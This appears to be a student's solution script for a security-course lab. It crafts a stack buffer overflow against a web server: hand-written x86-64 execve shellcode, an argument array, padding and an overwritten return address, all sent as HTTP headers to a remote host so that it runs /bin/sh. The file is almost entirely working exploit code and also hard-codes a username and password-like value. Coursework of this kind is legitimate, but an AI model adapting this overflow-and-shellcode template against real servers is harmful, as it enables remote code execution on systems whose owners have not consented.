import socket
import random

from requests import post

from stage1 import DATA

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')

# Method should always be get
METHOD = b"GET/HTTP/1.1"

USER = b"tdiallo"
PASSWORD = b"d83887129a"

# These are the arguments that make up the shell script we want to execve.
# Don't forget that there needs to be a NULL pointer as the last argument in addition to these!
SCRIPT = [b"/bin/sh\x00", b"-c\x00", b"echo -n " + USER + b" | sha384sum > /hackme/tiny/tokens/" + PASSWORD + b"\x00"]

# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

PORT = 10001 #random.randint(10000, 10025)
CODE = b"\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x90\x55\x58\x58\x48\xc7\xc6\xd8\x55\x58\x58\x48\xc7\xc2\xf0\x55\x58\x58\x0f\x05"

point_0 = to_bytes(0x58585590)
point_1 = to_bytes(0x58585590 + len(SCRIPT[0]))
point_2 = to_bytes(0x58585590 + len(SCRIPT[0])+ len(SCRIPT[1]))
point_3 = to_bytes(0x0)
ARRAY = point_0 + point_1 + point_2 + point_3
print(0x58585590 + len(SCRIPT[0])+ len(SCRIPT[1]) + len(SCRIPT[2]) + len(ARRAY))

# Figure out how many bytes we need to pad until we get to the return address 
# on the stack. (Hint: It's not 10...)
N = 1008 - len(CODE) - len(SCRIPT[0]) - len(SCRIPT[1]) - len(SCRIPT[2]) - len(ARRAY)
PADDING = b"\xff" * N

# Fill this in with the address you actually want instead of `0xdeadbeef`
ADDRESS = to_bytes(0x585855F8)

# The "exploit string" is what we send in as the headers
HEADERS = SCRIPT[0] +SCRIPT[1] + SCRIPT[2] + ARRAY + CODE + PADDING + ADDRESS

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = METHOD + b" " + URL + b"\r\n" + HEADERS + b"\r\n\r\n"
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
